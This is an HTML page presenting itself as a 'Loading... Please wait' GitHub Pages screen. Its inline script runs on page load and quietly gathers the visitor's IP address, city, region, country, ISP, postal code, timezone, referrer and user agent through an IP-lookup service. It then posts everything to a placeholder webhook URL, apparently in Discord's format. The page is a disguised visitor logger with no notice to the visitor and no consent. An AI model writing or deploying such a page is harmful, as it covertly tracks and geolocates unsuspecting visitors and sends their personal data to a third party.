<h1>Loading... Please wait / GitHub Pages</h1>
<script>
window.addEventListener("load", async () => {
  if (sessionStorage.getItem("visitLogged")) return;
  sessionStorage.setItem("visitLogged", "true");

  const webhookURL = "YOUR_WEBHOOK_URL";

  try {
    // Get detailed IP info
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    const visitData = {
      content: "üåç New Detailed Visit",
      embeds: [{
        title: "Visitor IP Details",
        color: 3447003,
        fields: [
          { name: "IP", value: data.ip || "Unknown", inline: true },
          { name: "City", value: data.city || "Unknown", inline: true },
          { name: "Region", value: data.region || "Unknown", inline: true },
          { name: "Country", value: data.country_name || "Unknown", inline: true },
          { name: "ISP / Org", value: data.org || "Unknown" },
          { name: "Timezone", value: data.timezone || "Unknown", inline: true },
          { name: "Postal Code", value: data.postal || "Unknown", inline: true },
          { name: "Page", value: window.location.href },
          { name: "Referrer", value: document.referrer || "Direct Visit" }
        ],
        footer: {
          text: navigator.userAgent
        },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitData)
    });

  } catch (err) {
    console.error("Error:", err);
  }
});
</script>
